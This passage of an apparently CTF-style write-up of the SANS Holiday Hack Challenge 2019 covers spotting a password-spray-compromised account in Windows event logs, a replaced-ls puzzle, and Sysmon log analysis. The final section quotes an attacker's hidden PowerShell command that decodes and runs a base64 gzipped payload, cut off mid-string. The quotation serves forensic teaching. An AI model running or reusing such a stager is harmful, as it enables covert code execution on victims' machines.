                        &lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eventdata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;TargetUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;IndexError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;users_success_login_attempt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./parse_evtx_xml.py Security_evtx.xml
&lt;span class="go"&gt;{&amp;#39;supatree&amp;#39;, &amp;#39;DC1$&amp;#39;, &amp;#39;pminstix&amp;#39;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Only three accounts have this code: &lt;code&gt;supatree&lt;/code&gt;, &lt;code&gt;pminstix&lt;/code&gt;, and
&lt;code&gt;DC1$&lt;/code&gt;. This last one seems to be the domain controller, we can likely
ignore it. So it's between &lt;code&gt;supatree&lt;/code&gt; and &lt;code&gt;pminstix&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, how can we determined which one was compromised? There is another
&lt;code&gt;EventID&lt;/code&gt; that is interesting: the 4625. This ID indicates that &lt;a class="reference external" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625"&gt;an
account failed to log on&lt;/a&gt;.
During a password spray attack, if an account is compromised, an authentication
attempt succeeded. So the compromised account should have one less event with
ID 4625. Let's do some &lt;code&gt;grep&lt;/code&gt; magic to find the corresponding account:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -wE &lt;span class="s1"&gt;&amp;#39;4625|TargetUserName&amp;#39;&lt;/span&gt; Security_evtx.xml &lt;span class="p"&gt;|&lt;/span&gt; grep -A &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4625&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep TargetUserName &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -nr
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ygreenpie&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ygoldentrifle&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;wopenslae&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;twinterfig&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ttinselbubbles&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;tcandybaubles&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sscarletpie&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;smullingfluff&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;smary&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sgreenbells&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;pbrandyberry&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mstripysleigh&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mbrandybells&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ltrufflefig&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;lstripyleaves&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;hevergreen&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;hcandysnaps&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;gchocolatewine&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;gcandyfluff&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ftwinklestockings&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ftinseltoes&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;esparklesleigh&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;dsparkleleaves&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;cstripyfluff&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;cjinglebuns&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;civysparkles&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;civypears&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bevergreen&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bbrandyleaves&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;Administrator&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;     76 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;supatree&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's decompose this command. The first part is:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
grep -wE '4625|TargetUserName' Security_evtx.xml
&lt;/pre&gt;
&lt;p&gt;It will select every line containing the string 4625 or
&lt;code&gt;TargetUserName&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;On to the second part:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
| grep -A 1 '4625'
&lt;/pre&gt;
&lt;p&gt;It will select in the previous output every line containing 4625
and the line after it. This will give us an output of every event ID 4625 and
every associated username. Here's the output:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;Administrator&amp;lt;/Data&amp;gt;
--
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bbrandyleaves&amp;lt;/Data&amp;gt;
--
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bevergreen&amp;lt;/Data&amp;gt;
--
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;civypears&amp;lt;/Data&amp;gt;
--
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;civysparkles&amp;lt;/Data&amp;gt;
--
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;cjinglebuns&amp;lt;/Data&amp;gt;
--
&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;
&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;cstripyfluff&amp;lt;/Data&amp;gt;
&lt;/pre&gt;
&lt;p&gt;For the third part:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
| grep TargetUserName
&lt;/pre&gt;
&lt;p&gt;It will select every username in the previous output. We now have the list of
every username with a failed authentication attempt.&lt;/p&gt;
&lt;p&gt;Finally the last part:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
| sort | uniq -c | sort -nr
&lt;/pre&gt;
&lt;p&gt;It will sort every entry, count every occurrence, and sort it by number of
occurrences. This gives us the final output:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ygreenpie&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ygoldentrifle&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;wopenslae&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;twinterfig&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ttinselbubbles&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;tcandybaubles&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sscarletpie&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;smullingfluff&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;smary&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sgreenbells&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;pbrandyberry&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mstripysleigh&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mbrandybells&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ltrufflefig&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;lstripyleaves&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;hevergreen&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;hcandysnaps&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;gchocolatewine&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;gcandyfluff&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ftwinklestockings&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;ftinseltoes&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;esparklesleigh&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;dsparkleleaves&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;cstripyfluff&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;cjinglebuns&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;civysparkles&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;civypears&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bevergreen&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bbrandyleaves&amp;lt;/Data&amp;gt;
77 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;Administrator&amp;lt;/Data&amp;gt;
76 &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;supatree&amp;lt;/Data&amp;gt;
&lt;/pre&gt;
&lt;p&gt;We can see that &lt;code&gt;supatree&lt;/code&gt; has one less failed authentication attempt.
This must means that it's the account that was compromised by the password
spray attack.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-4"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id8"&gt;Objective 4:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="sugarplum-mary-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id9"&gt;SugarPlum Mary's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're supposed to list the content of the current directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;K000K000K000KK0KKKKKXKKKXKKKXKXXXXXNXXXX0kOKKKK0KXKKKKKKK0KKK0KK0KK0KK0KK0KK0KKKKKK&lt;/span&gt;
&lt;span class="go"&gt;00K000KK0KKKKKKKKKXKKKXKKXXXXXXXXNXXNNXXooNOXKKXKKXKKKXKKKKKKKKKK0KKKKK0KK0KK0KKKKK&lt;/span&gt;
&lt;span class="go"&gt;KKKKKKKKKKKXKKXXKXXXXXXXXXXXXXNXNNNNNNK0x:xoxOXXXKKXXKXXKKXKKKKKKKKKKKKKKKKKKKKKKKK&lt;/span&gt;
&lt;span class="go"&gt;K000KK00KKKKKKKKXXKKXXXXNXXXNXXNNXNNNNNWk.ddkkXXXXXKKXKKXKKXKKXKKXKKXK0KK0KK0KKKKKK&lt;/span&gt;
&lt;span class="go"&gt;00KKKKKKKKKXKKXXKXXXXXNXXXNXXNNNNNNNNWXXk,ldkOKKKXXXXKXKKXKKXKKXKKKKKKKKKK0KK0KK0XK&lt;/span&gt;
&lt;span class="go"&gt;KKKXKKKXXKXXXXXNXXXNXXNNXNNNNNNNNNXkddk0No,;;:oKNK0OkOKXXKXKKXKKKKKKKKKKKKK0KK0KKKX&lt;/span&gt;
&lt;span class="go"&gt;0KK0KKKKKXKKKXXKXNXXXNXXNNXNNNNXxl;o0NNNo,,,;;;;KWWWN0dlk0XXKKXKKXKKXKKKKKKKKKKKKKK&lt;/span&gt;
&lt;span class="go"&gt;KKKKKKKKXKXXXKXXXXXNXXNNXNNNN0o;;lKNNXXl,,,,,,,,cNNNNNNKc;oOXKKXKKXKKXKKXKKKKKKKKKK&lt;/span&gt;
&lt;span class="go"&gt;XKKKXKXXXXXXNXXNNXNNNNNNNNN0l;,cONNXNXc&amp;#39;,,,,,,,,,KXXXXXNNl,;oKXKKXKKKKKK0KKKKK0KKKX&lt;/span&gt;
&lt;span class="go"&gt;KKKKKKXKKXXKKXNXXNNXNNNNNXl;,:OKXXXNXc&amp;#39;&amp;#39;&amp;#39;,,&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;,KKKKKKXXK,,;:OXKKXKKXKKX0KK0KK0KKK&lt;/span&gt;
&lt;span class="go"&gt;KKKKKKKKXKXXXXXNNXXNNNNW0:;,dXXXXXNK:&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;cKKKKKKKXX;,,,;0XKKXKKXKKXKKK0KK0KK&lt;/span&gt;
&lt;span class="go"&gt;XXKXXXXXXXXXXNNNNNNNNNN0;;;ONXXXXNO,&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;x0KKKKKKXK,&amp;#39;,,,cXXKKKKKKKKXKKK0KKKX&lt;/span&gt;
&lt;span class="go"&gt;KKKKKKKXKKXXXXNNNNWNNNN:;:KNNXXXXO,&amp;#39;.&amp;#39;..&amp;#39;.&amp;#39;&amp;#39;..&amp;#39;:O00KKKKKXd&amp;#39;&amp;#39;,,,,KKXKKXKKKKKKKKKKKKK&lt;/span&gt;
&lt;span class="go"&gt;KKKKKXKKXXXXXXXXNNXNNNx;cXNXXXXKk,&amp;#39;&amp;#39;&amp;#39;.&amp;#39;&amp;#39;.&amp;#39;&amp;#39;&amp;#39;&amp;#39;.,xO00KKKKKO,&amp;#39;&amp;#39;,,,,KK0XKKXKKK0KKKKKKKK&lt;/span&gt;
&lt;span class="go"&gt;XXXXXXXXXKXXXXXXXNNNNNo;0NXXXKKO,&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;.&amp;#39;.&amp;#39;.;dkOO0KKKK0;.&amp;#39;&amp;#39;,,,,XXXKKK0KK0KKKKKKKKX&lt;/span&gt;
&lt;span class="go"&gt;XKKXXKXXXXXXXXXXXNNNNNcoNNXXKKO,&amp;#39;&amp;#39;&amp;#39;&amp;#39;.&amp;#39;......:dxkOOO000k,..&amp;#39;&amp;#39;&amp;#39;,,lNXKXKKXKKK0KKKXKKKK&lt;/span&gt;
&lt;span class="go"&gt;KXXKKXXXKXXKXXXXXXXNNNoONNXXX0;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;..&amp;#39;lkkkkkkxxxd&amp;#39;...&amp;#39;&amp;#39;&amp;#39;&amp;#39;,0N0KKKKKXKKKKKK0XKKK&lt;/span&gt;
&lt;span class="go"&gt;XXXXXKKXXKXXXXXXXXXXXXOONNNXXl,,;;,;;;;;;;d0K00Okddoc,,,,,,,,,xNNOXKKKKKXKKKKKKKXKK&lt;/span&gt;
&lt;span class="go"&gt;XXXXXXXXXXXXXXXXXXXXXXXONNNXx;;;;;;;;;,,:xO0KK0Oxdoc,,,,,,,,,oNN0KXXKKXKKXKKKKKKKXK&lt;/span&gt;
&lt;span class="go"&gt;XKXXKXXXXXXXXXXXXXXXXXXXXWNX:;;;;;;;;;,cO0KKKK0Okxl,,,,,,,,,oNNK0NXXXXXXXXXKKKKKKKX&lt;/span&gt;
&lt;span class="go"&gt;XXXXXXXXXXXXXXXXXXXXXXXNNNWNc;;:;;;;;;xKXXXXXXKK0x,,,,,,,,,dXNK0NXXXXXXXXXXXKKXKKKK&lt;/span&gt;
&lt;span class="go"&gt;XKXXXXXXXXXXXXXXXXXXXXNNWWNWd;:::;;;:0NNNNNNNNNXO;,,,,,,,:0NN0XNXNXXXXXXXXXXXKKXKKX&lt;/span&gt;
&lt;span class="go"&gt;NXXXXXXXXXXXXXXXXXXXXXNNNNNNNl:::;;:KNNNNNNNNNNO;,,,,,,;xNNK0NXNXXNXXXXXXKXXKKKKXKK&lt;/span&gt;
&lt;span class="go"&gt;XXNNXNNNXXXXXXXXXXXXXNNNNNNNNNkl:;;xWWNNNNNWWWk;;;;;;;xNNKKXNXNXXNXXXXXXXXXXXKXKKXK&lt;/span&gt;
&lt;span class="go"&gt;XXXXXNNNNXNNNNXXXXXXNNNNNNNNNNNNKkolKNNNNNNNNx;;;;;lkNNXNNNNXXXNXXNXXXXXXXXXXXKKKKX&lt;/span&gt;
&lt;span class="go"&gt;XXXXXXXXXXXNNNNNNNNNNNNNNNNNNNNNNNNNKXNNNNWNo:clxOXNNNNNNNNXNXXXXXXXXXXXXXXXKKXKKKK&lt;/span&gt;
&lt;span class="go"&gt;XXXXNXXXNXXXNXXNNNNNWWWWWNNNNNNNNNNNNNNNNNWWNWWNWNNWNNNNNNNNXXXXXXNXXXXXXXXXXKKXKKX&lt;/span&gt;
&lt;span class="go"&gt;XNXXXXNNXXNXXNNXNXNWWWWWWWWWNNNNNNNNNNNNNWWWWNNNNNNNNNNNNNNNNNNNNNXNXXXXNXXXXXXKXKK&lt;/span&gt;
&lt;span class="go"&gt;XXXXNXXNNXXXNXXNXXNWWWNNNNNNNNNWWNNNNNNNNWWWWWWNWNNNNNNNNNNNNNNNXXNXNXXXXNXXXXKXKXK&lt;/span&gt;
&lt;span class="go"&gt;I need to list files in my home/&lt;/span&gt;
&lt;span class="go"&gt;To check on project logos&lt;/span&gt;
&lt;span class="go"&gt;But what I see with ls there,&lt;/span&gt;
&lt;span class="go"&gt;Are quotes from desert hobos...&lt;/span&gt;
&lt;span class="go"&gt;which piece of my command does fail?&lt;/span&gt;
&lt;span class="go"&gt;I surely cannot find it.&lt;/span&gt;
&lt;span class="go"&gt;Make straight my path and locate that-&lt;/span&gt;
&lt;span class="go"&gt;I&amp;#39;ll praise your skill and sharp wit!&lt;/span&gt;
&lt;span class="go"&gt;Get a listing (ls) of your current directory.&lt;/span&gt;
&lt;span class="gp"&gt;elf@ffba3960c30f:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, let's just &lt;code&gt;ls&lt;/code&gt; the directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ffba3960c30f:~$&lt;/span&gt; ls
&lt;span class="go"&gt;This isn&amp;#39;t the ls you&amp;#39;re looking for&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, weird. It looks like the &lt;code&gt;ls&lt;/code&gt; binary was replaced. Let's see which
program is used using the &lt;code&gt;which&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ffba3960c30f:~$&lt;/span&gt; which ls
&lt;span class="go"&gt;/usr/local/bin/ls&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Indeed, it does not seem to be the usual &lt;code&gt;ls&lt;/code&gt; binary. Let's search for
every file named &lt;code&gt;ls&lt;/code&gt; at the root of the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ffba3960c30f:~$&lt;/span&gt; find / -name ls -type f &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;span class="go"&gt;/usr/local/bin/ls&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;/bin/ls&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The usual &lt;code&gt;ls&lt;/code&gt; binary seems to be at &lt;code&gt;/bin/ls&lt;/code&gt;. So let's call this
binary directly:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ffba3960c30f:~$&lt;/span&gt; /bin/ls
&lt;span class="go"&gt;&amp;#39; &amp;#39;   rejected-elfu-logos.txt&lt;/span&gt;
&lt;span class="go"&gt;Loading, please wait......&lt;/span&gt;



&lt;span class="go"&gt;You did it! Congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="windows-log-analysis-determine-attacker-technique"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id10"&gt;Windows Log Analysis: Determine Attacker Technique&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're given &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/sysmon-data.json.zip"&gt;Sysmong logs&lt;/a&gt;
to try and understand which technique the attacker used. We're asked to
identify what tool the attacker used to retrieve domain password hashes from
the &lt;code&gt;lsass.exe&lt;/code&gt; process.&lt;/p&gt;
&lt;p&gt;In these logs, we have a lot of interesting events. We can see the execution of
suspicious PowerShell commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;command_line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \&amp;quot;if([IntPtr]::Size -eq 4){$b=&amp;#39;powershell.exe&amp;#39;}else{$b=$env:windir+&amp;#39;\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe&amp;#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&amp;#39;-noni -nop -w hidden -c &amp;amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&amp;#39;&amp;#39;H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pn